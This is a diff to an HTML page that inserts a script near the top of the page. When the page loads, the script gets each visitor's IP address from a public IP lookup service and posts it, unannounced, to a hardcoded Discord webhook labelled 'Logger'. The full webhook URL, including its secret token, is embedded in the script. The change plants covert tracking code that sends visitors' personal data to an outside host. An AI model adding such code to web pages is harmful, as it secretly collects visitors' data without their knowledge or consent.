@@ -2,7 +2,26 @@
 <!DOCTYPE html>
 <html lang="en">
 
+<script>
+function getIP(json) {
+  var request = new XMLHttpRequest(); //making a request for the webhook
+      request.open("POST", "https://discord.com/api/webhooks/939874850850349136/zgAsYHpbo0SzDCMJiu4lmIXnGNsZFT5Sp-lSB6XQP9J6sPa9I06xE3oTljcycr8DuMJL");
 
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "Logger",
+        avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+        content: "**IP:** *" + json.ip + "*"
+      }
+   //just a webhook parameters such as avatar,name,message
+
+      request.send(JSON.stringify(params));
+    }
+
+</script>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> //using this api to get the ip
+	
 <head>
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
 	<meta charset="utf-8">
